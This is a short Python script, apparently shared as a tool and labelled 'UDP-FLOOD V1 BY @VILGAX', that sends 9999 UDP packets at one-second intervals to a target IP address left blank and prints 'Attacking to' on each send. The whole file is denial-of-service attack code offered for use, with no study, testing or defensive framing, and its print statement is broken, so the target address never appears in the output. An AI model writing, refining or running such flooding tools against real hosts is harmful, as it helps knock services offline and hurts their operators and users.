import socket
import time
 
target_ip= ""
 
num_req = 9999
 
msg = "UDP-FLOOD V1 BY @VILGAX"
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for i in range(num_req):
    sock.sendto(msg.encode(), (target_ip, 0)) 
    print("Attacking to + {target_ip} ")
    time.sleep(1)